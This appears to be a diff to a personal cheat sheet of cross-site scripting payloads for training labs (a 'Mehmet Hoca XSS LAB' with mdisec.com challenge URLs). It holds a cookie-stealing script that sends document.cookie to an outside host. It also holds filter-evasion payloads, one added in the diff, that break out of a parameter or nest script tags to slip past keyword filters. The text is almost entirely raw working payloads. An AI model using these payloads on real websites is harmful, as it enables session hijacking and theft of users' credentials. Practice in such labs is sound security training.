@@ -9,5 +9,7 @@ LOW
 <script>id = document.cookie; window.location.assign(“http://www.yazilimodasi.com?id=” + id)</script>
 
 Mehmet Hoca XSS LAB
+XSS-1
+http://mdisec.com/h4ckm3/xss-1/index.php?ali=';ALalertERT(1);+var+f='
 XSS-2
 http://mdisec.com/h4ckm3/xss-2/index.php?ali=</scrSCRIPTipt><scSCRIPTript>alALERTert(1);</scSCRIPTript>
